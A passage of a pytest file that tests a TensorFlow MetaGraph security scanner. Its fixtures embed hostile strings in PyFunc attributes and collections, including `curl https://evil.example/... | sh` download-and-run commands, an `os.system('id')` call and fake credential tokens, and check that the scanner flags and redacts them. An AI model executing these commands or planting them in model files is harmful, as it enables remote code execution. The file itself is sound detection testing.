                            rf"token\U0000003d{escaped_secrets['long_unicode']} "
                            rf"token\N{{EQUALS SIGN}}{escaped_secrets['named_unicode']} "
                            rf"token\u{{3d}}{escaped_secrets['braced_unicode']} "
                            rf"token\75{escaped_secrets['short_octal']} "
                            rf"token\a={escaped_secrets['mnemonic_alert']} "
                            rf"token\b={escaped_secrets['mnemonic_backspace']} "
                            rf"token\f={escaped_secrets['mnemonic_form_feed']} "
                            rf"token\n={escaped_secrets['mnemonic_newline']} "
                            rf"token\r={escaped_secrets['mnemonic_carriage_return']} "
                            rf"token\t={escaped_secrets['mnemonic_tab']} "
                            rf"token\v={escaped_secrets['mnemonic_vertical_tab']} "
                            f"{line_continuation} {crlf_continuation}"
                        ),
                        "auth": f"python -c curl https://example.com/ {escaped_secrets['auth']}",
                        "auth_header": (f"python -c curl https://example.com/ {escaped_secrets['auth_header']}"),
                    },
                }
            ],
            collection_bytes={
                "runtime_hook_cookie_header": [
                    f"python -c curl https://example.com/ {escaped_secrets['cookie']}".encode()
                ]
            },
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(escaped_meta))
    executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
    previews_by_attribute = {check.details["attribute"]: check.details["value_preview"] for check in executable_checks}
    collection_check = next(check for check in result.checks if check.name == "MetaGraph Collection Executable Pattern")
    serialized_result = result.to_json()

    assert previews_by_attribute["auth"] == REDACTED_EVIDENCE_VALUE
    assert previews_by_attribute["auth_header"] == REDACTED_EVIDENCE_VALUE
    assert collection_check.details["value_preview"] == REDACTED_EVIDENCE_VALUE
    assert all(secret not in serialized_result for secret in escaped_secrets.values())


def test_tf_metagraph_scanner_redacts_values_under_escaped_sensitive_keys(tmp_path: Path) -> None:
    attribute_secret = "OPAQUE_ESCAPED_ATTRIBUTE_SECRET_123456"
    collection_secret = "OPAQUE_ESCAPED_COLLECTION_SECRET_123456"
    escaped_key_meta = tmp_path / "escaped-sensitive-keys.meta"
    escaped_key_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "escaped_key_node",
                    "op": "PyFunc",
                    "attrs": {r"to\u006ben": f"python -c curl https://example.com/ {attribute_secret}"},
                }
            ],
            collection_bytes={
                r"runtime_hook_to\u006ben": [f"python -c curl https://example.com/ {collection_secret}".encode()]
            },
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(escaped_key_meta))
    executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
    collection_check = next(check for check in result.checks if check.name == "MetaGraph Collection Executable Pattern")

    assert executable_check.details["attribute"] == "token"
    assert executable_check.details["value_preview"] == REDACTED_EVIDENCE_VALUE
    assert collection_check.details["collection_key"] == "runtime_hook_token"
    assert collection_check.details["value_preview"] == REDACTED_EVIDENCE_VALUE
    assert attribute_secret not in result.to_json()
    assert collection_secret not in result.to_json()


def test_redact_metagraph_evidence_preserves_benign_windows_path_escapes() -> None:
    windows_path = r"C:\x64\models\plugin.dll"

    assert _redact_metagraph_evidence(windows_path, max_chars=200) == windows_path


def test_tf_metagraph_scanner_uses_fast_path_for_plain_finding_contexts(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    plain_meta = tmp_path / "many-plain-findings.meta"
    plain_meta.write_bytes(
        _build_metagraph(graph_nodes=[{"name": f"node_{index}", "op": "PyFunc"} for index in range(1_000)])
    )

    def reject_shared_redactor(*_args: object, **_kwargs: object) -> str:
        raise AssertionError("plain generated contexts should bypass the full evidence redactor")

    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner.redact_evidence_string", reject_shared_redactor)

    result = TensorFlowMetaGraphScanner().scan(str(plain_meta))

    operation_checks = [
        check for check in result.checks if check.name == "TensorFlow MetaGraph Operation Security Check"
    ]
    assert len(operation_checks) == 1_000


@pytest.mark.parametrize(
    "secret",
    [
        "hf_" + ("a" * 30),
        "glpat-" + ("a" * 20),
        "sk_live_" + ("a" * 24),
        "rk_live_" + ("a" * 24),
        "sk-" + ("a" * 24),
        "sq0atp-" + ("a" * 22),
        "sq0csp-" + ("a" * 43),
    ],
)
def test_tf_metagraph_fast_path_rejects_standalone_provider_secrets(secret: str) -> None:
    assert secret not in _redact_metagraph_evidence(secret, max_chars=200)


def test_tf_metagraph_scanner_handles_unicode_tokenizer_errors(tmp_path: Path) -> None:
    secret = "REAL_METAGRAPH_UNICODE_SECRET"
    unicode_meta = tmp_path / "unicode-tokenizer-error.meta"
    unicode_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "unicode_node",
                    "op": "PyFunc",
                    "attrs": {"script": f"curl https://example.com/?token={secret}\rو"},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(unicode_meta))

    assert result.metadata.get("operational_error") is not True
    assert any(check.name == "MetaGraph Executable String Check" for check in result.checks)
    assert secret not in result.to_json()


@pytest.mark.parametrize(
    "secret",
    [
        "gho_" + ("a" * 36),
        "ghu_" + ("a" * 36),
        "ghr_" + ("a" * 36),
        "sk-proj-" + ("a" * 32),
        "sk-proj-" + ("a_b-" * 8),
        "npm_" + ("a" * 36),
        "xoxb-" + ("a" * 24),
        "gho%5F" + ("a" * 36),
        "gho%255F" + ("a" * 36),
        "gho%2525255F" + ("a" * 36),
    ],
)
def test_tf_metagraph_scanner_redacts_standalone_secret_tokens(tmp_path: Path, secret: str) -> None:
    malicious_meta = tmp_path / "standalone-secret.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"script": f"python -c 'print(1)' {secret}"},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
    executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")

    assert secret not in result.to_json()
    assert REDACTED_EVIDENCE_VALUE in executable_check.details["value_preview"]


def test_tf_metagraph_scanner_redacts_r_access_identifier_assignments(tmp_path: Path) -> None:
    google_secret = "service-account@example.iam.gserviceaccount.com"
    aws_secret = "AKIAEXAMPLEACCESSKEY"
    script = (
        f"python -c \"import os; os.system('id')\"; google_access_id <- '{google_secret}'; "
        f'GoogleAccessId <<- "{google_secret}"; access_key_id <- "{aws_secret}"'
    )
    malicious_meta = tmp_path / "r-access-identifiers.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"script": script},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
    executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
    serialized_result = result.to_json()

    assert google_secret not in serialized_result
    assert aws_secret not in serialized_result
    assert REDACTED_EVIDENCE_VALUE in executable_check.details["value_preview"]


@pytest.mark.parametrize(
    "near_match",
    [
        "gho_" + ("a" * 35),
        "prefixgho_" + ("a" * 36),
        "sk-" + ("a" * 23),
        "sk-proj-example",
        "npm_" + ("a" * 35),
        "xoxb-" + ("a" * 19),
        "gho%5F" + ("a" * 35),
    ],
)
def test_tf_metagraph_scanner_preserves_standalone_secret_near_matches(tmp_path: Path, near_match: str) -> None:
    public_context = f"python -c 'print(1)' {near_match}"
    public_meta = tmp_path / "standalone-secret-near-match.meta"
    public_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"script": public_context},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(public_meta))
    executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")

    assert executable_check.details["value_preview"] == public_context


def test_tf_metagraph_scanner_inspects_collection_payload_through_collection_limit(tmp_path: Path) -> None:
    malicious_meta = tmp_path / "late-collection-payload.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[{"name": "const", "op": "Const"}],
            collection_bytes={
                "runtime_hook": [
                    (b"x" * (_MAX_ATTR_VALUE_BYTES + 1)) + b" python -c 'curl https://evil.example/late | sh'"
                ]
            },
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))

    assert any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)


def test_tf_metagraph_scanner_inspects_collection_only_metagraph_payload(tmp_path: Path) -> None:
    collection_only_meta = tmp_path / "collection-only.meta"
    collection_only_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[],
            collection_bytes={"runtime_hook": [b"python -c 'curl https://evil.example/collection | sh'"]},
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(collection_only_meta))

    assert result.metadata["graph_node_count"] == 0
    assert result.metadata["collection_count"] == 1
    assert any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)


@pytest.mark.parametrize("op_name", ["LoadLibrary", "LoadLibraryV2"])
def test_tf_metagraph_scanner_flags_loadlibrary_ops_without_path_attributes(tmp_path: Path, op_name: str) -> None:
    loadlibrary_meta = tmp_path / f"{op_name.lower()}.meta"
    loadlibrary_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "plugin_loader",
                    "op": op_name,
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(loadlibrary_meta))

    assert result.success is False
    assert any(
        issue.message
        and f"Dangerous TensorFlow operation: {op_name}" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("op_type") == op_name
        for issue in result.issues
    )


def test_tf_metagraph_scanner_comment_token_does_not_suppress_malicious_detection(tmp_path: Path) -> None:
    malicious_meta = tmp_path / "malicious-comment.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"func": "# os.system('curl https://evil.example/p.sh | sh')"},
                }
            ],
            collection_bytes={"runtime_hook": [b"# python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))

    assert result.success is False
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any("Executable String Check" in check.name for check in result.checks)


def test_tf_metagraph_scanner_false_positive_control_substring_op_name(tmp_path: Path) -> None:
    false_positive_candidate = tmp_path / "fp.meta"
    false_positive_candidate.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "custom_node",
                    "op": "CustomPyFuncMetrics",  # contains "PyFunc" substring but is a different op
                    "attrs": {"notes": "exec and eval terms in non-executable custom metadata"},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(false_positive_candidate))

    assert result.success is True
    assert all(issue.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_tf_metagraph_scanner_detects_func_references_in_executable_attr_values(tmp_path: Path) -> None:
    function_ref_meta = tmp_path / "func-ref.meta"
    function_ref_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "dangerous_call",
                    "op": "StatefulPartitionedCall",
                    "function_ref": "os.system",
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(function_ref_meta))

    assert result.success is False
    assert any(
        issue.message
        and "Suspicious command/network string found in executable TensorFlow op attribute" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("attribute") == "f.func.name"
        and issue.details.get("value_preview") == "os.system"
        for issue in result.issues
    )


def test_tf_metagraph_scanner_func_reference_false_positive_control(tmp_path: Path) -> None:
    benign_function_ref_meta = tmp_path / "benign-func-ref.meta"
    benign_function_ref_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "benign_call",
                    "op": "StatefulPartitionedCall",
                    "function_ref": "custom_package.systematic_math",
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(benign_function_ref_meta))

    assert result.success is True
    assert not any(
        issue.message
        and "custom_package.systematic_math" in issue.message
        and "command/network string" in issue.message
        for issue in result.issues
    )


def test_tf_metagraph_scanner_detects_split_encoded_payload_and_oversized_attrs(tmp_path: Path) -> None:
    suspicious_meta = tmp_path / "split-payload.meta"
    encoded_blob = "A" * 192
    suspicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {
                        "decoder": "base64.b64decode",
                        "payload": encoded_blob,
                        "script": "A" * (_MAX_ATTR_VALUE_BYTES + 512),
                    },
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(suspicious_meta))

    assert result.success is False
    encoded_payload_issues = [
        issue for issue in result.issues if issue.message and "Encoded payload indicator found" in issue.message
    ]
    assert encoded_payload_issues
    serialized_result = json.dumps(
        {
            "checks": [check.to_dict() for check in result.checks],
            "issues": [issue.to_dict() for issue in result.issues],
        }
    )
    assert encoded_blob not in serialized_result
    assert encoded_payload_issues[0].details["value_preview"] == "<redacted>"
    assert any(
        issue.message
        and "Large executable-context attribute detected" in issue.message
        and issue.details.get("attribute") == "script"
        and issue.details.get("attribute_length") == _MAX_ATTR_VALUE_BYTES + 512
        for issue in result.issues
    )


def test_tf_metagraph_scanner_checkpoint_io_ops_not_critical(tmp_path: Path) -> None:
    checkpoint_meta = tmp_path / "checkpoint.meta"
    checkpoint_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {"name": "save_op", "op": "SaveV2"},
                {"name": "restore_op", "op": "RestoreV2"},
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(checkpoint_meta))

    assert all(issue.details.get("op_type") not in {"SaveV2", "RestoreV2"} for issue in result.issues)
    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)


def test_tf_metagraph_scanner_corrupt_protobuf(tmp_path: Path) -> None:
    corrupt_meta = tmp_path / "corrupt.meta"
    corrupt_meta.write_bytes(b"\x0a\x08broken")

    assert TensorFlowMetaGraphScanner.can_handle(str(corrupt_meta)) is False

    result = TensorFlowMetaGraphScanner().scan(str(corrupt_meta))
    assert result.success is False
    assert any("Invalid or corrupt TensorFlow MetaGraph protobuf" in issue.message for issue in result.issues)


def test_tf_metagraph_scanner_records_discovery_assumptions(tmp_path: Path) -> None:
    valid_meta = tmp_path / "meta_assumptions.meta"
    valid_meta.write_bytes(
        _build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "output", "op": "Identity"}])
    )

    result = TensorFlowMetaGraphScanner().scan(str(valid_meta))

    assert result.metadata["discovery_assumptions"] == DISCOVERY_ASSUMPTIONS
